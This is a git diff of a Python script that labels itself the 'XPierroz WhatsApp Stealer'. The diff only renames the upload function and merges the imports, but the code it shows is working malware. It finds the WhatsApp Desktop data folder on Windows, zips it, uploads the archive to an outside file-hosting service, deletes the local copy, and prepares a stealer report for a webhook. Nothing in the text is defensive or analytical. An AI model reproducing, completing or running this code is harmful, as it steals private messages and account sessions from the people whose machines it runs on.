@@ -1,16 +1,12 @@
-import os
-import requests
-import time
-import socket
-import shutil
+import os, requests, time, socket, shutil
 
 # PSG > OM
 
-WEBHOOK = "xpierroz on top"
+WEBHOOK = "xpierroz and darknosy on top"
 direct = f"{os.getenv('LOCALAPPDATA')}\\Packages\\5319275A.WhatsAppDesktop_cv1g1gvanyjgm"
 print(direct)
 
-def uploadToGofile(path):
+def upload(path):
     for x in range(10):
         try:
             rr = requests.post(
@@ -29,7 +25,7 @@ try:
 except Exception: 
     pass
 
-m = uploadToGofile(f"{os.getcwd()}\\ssouput.zip")
+m = upload(f"{os.getcwd()}\\ssouput.zip")
 os.remove(f"{os.getcwd()}\\ssouput.zip")
 
 message = f"**XPierroz WhatsApp Stealer Report**\n\n"
